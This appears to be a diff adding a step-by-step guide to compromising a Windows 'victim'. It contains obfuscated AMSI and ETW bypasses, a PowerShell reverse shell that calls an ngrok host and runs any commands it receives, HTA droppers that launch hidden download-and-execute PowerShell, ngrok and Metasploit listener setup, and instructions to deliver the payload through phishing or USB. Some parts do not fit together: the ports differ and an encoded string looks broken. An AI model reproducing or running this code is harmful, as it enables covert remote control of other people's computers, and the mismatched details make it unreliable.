@@ -1,0 +1,183 @@
+# Step 1: Create the PowerShell Reverse Shell (payload.ps1)
+# This script will create a reverse TCP connection back to your Kali machine and provide a Meterpreter shell once executed by the victim.
+
+# Create the payload.ps1
+# paylaod.ps1 file
+
+# ========================
+# Stealthy AMSI Bypass
+# ========================
+$aa = [Ref].Assembly.GetType(('System.Management.Automation.' -replace 'ion.','ion.Ams') + 'iU' + 'tils')
+$ab = $aa.GetField(('a' + 'msiInitFai' + 'led'),'NonPublic,Static')
+$ab.SetValue($null, $true)
+
+# Stealthy ETW Bypass
+# ========================
+[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')\
+.GetField('etwProvider','NonPublic,Static')\
+.SetValue($null,[System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()))
+
+# ========================
+# Reverse TCP Shell
+# ========================
+$ip = '0.tcp.ngrok.io'
+$port = 12345
+
+$c = New-Object Net.Sockets.TCPClient($ip, $port)
+$s = $c.GetStream()
+[byte[]]$b = 0..65535|%{0}
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
+    $r = (iex $d 2>&1 | Out-String)
+    $r2 = $r + 'PS ' + (pwd).Path + '> '
+    $sb = ([Text.Encoding]::ASCII).GetBytes($r2)
+    $s.Write($sb,0,$sb.Length)
+    $s.Flush()
+}
+$c.Close()
+
+
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+# Step 2: Host the Payload via Python HTTP Server
+# Now that we have the payload (payload.ps1), we need to serve it over HTTP so the victim can download it.
+
+# Create a directory to store both files (payload.ps1 and payload.hta).
+
+# bash
+# Copy code
+mkdir /path/to/your/payloads
+cd /path/to/your/payloads
+# Use Python to start an HTTP server in this directory:
+
+# bash
+# Copy code
+python3 -m http.server 8080
+# This will start a local web server on port 8080 that will serve the payload.ps1 file
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+
+# Step 3: Create the HTA Payload (payload.hta)
+# Now we need to create the HTA file that will execute the PowerShell script when opened with mshta.exe. The victim will open this HTA file, which will run the PowerShell script (hosted on your Kali server).
+
+# Create the payload.hta
+# html
+# Copy code
+# <!-- Filename: payload.hta -->
+
+<html>
+<head>
+    <script type="text/javascript">
+        // Using ActiveXObject to create a WScript.Shell object to run commands
+        var shell = new ActiveXObject("WScript.Shell");
+
+        // Running PowerShell hidden and downloading the PowerShell script
+        # shell.Run("powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://<your-kali-ip>:8080/payload.ps1')");
+# first run the below code separately somewheer
+
+#     $command = "iex (New-Object Net.WebClient).DownloadString('http://<your-ngrok-url>/payload.ps1')"
+# $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command))
+# $encodedCommand
+
+# This will output the Base64-encoded version of the command. It will look like this (note this is just an example):
+
+# plaintext
+# Copy code
+# aWVeIChOZXctT2JqZWN0IE5ldC5XZWJDbGllZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL3lvdXItbmdyb
+
+
+ shell.Run("powershell -w hidden -nop -EncodedCommand aWVeIChOZXctT2JqZWN0IE5ldC5XZWJDbGllZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL3lvdXItbmdyb2stdXJsL3BheWxvYWQucHNxJyk=");    
+    </script>
+</head>
+</html>
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+
+# Step 4: Expose the Server Using Ngrok
+# You need to expose your local machine to the internet for the victim to reach your HTTP server. Ngrok will allow you to create a secure tunnel.
+
+# Download Ngrok if you haven't already:
+https://ngrok.com/download
+
+# Expose the HTTP server to the internet:
+
+# Run the following command in your Kali machine (from the directory where the Python server is running):
+
+# bash
+# Copy code
+ngrok http 8080
+# After running Ngrok, you'll see an output like:
+
+# nginx
+# Copy code
+# Forwarding                    http://2b3f-123-45-67-89.ngrok.io -> http://localhost:8080
+# Copy the Ngrok URL (http://2b3f-123-45-67-89.ngrok.io in this case).
+
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+
+
+# Step 5: Update the HTA File with Ngrok URL
+# Edit the payload.hta file to replace <your-kali-ip> with the Ngrok URL.
+
+# html
+# Copy code
+# <!-- Updated Filename: payload.hta -->
+
+<html>
+<head>
+    <script type="text/javascript">
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://2b3f-123-45-67-89.ngrok.io/payload.ps1')");
+    </script>
+</head>
+</html>
+
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+
+
+# Step 6: Start the Metasploit Listener
+# Now, set up the listener in Metasploit to catch the reverse shell from the victim:
+
+Start msfconsole:
+
+bash
+Copy code
+msfconsole
+Set up the reverse handler:
+
+bash
+Copy code
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+Explanation:
+
+LHOST 0.0.0.0: Listens for connections on all available network interfaces (including the Ngrok tunnel).
+
+LPORT 4444: The port to listen for incoming connections.
+
+exploit -j: Starts the handler and runs in the background.
+
+
+# --------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------
+
+# Step 7: Deliver the Payload to the Victim
+Now, you can deliver the HTA payload to the victim via phishing, social engineering, or physical access (e.g., via USB or email).
+
+Once the victim executes the HTA file (mshta.exe <your-ngrok-url>/payload.hta), the PowerShell reverse shell will be triggered, and you'll get a Meterpreter session in your Metasploit console.
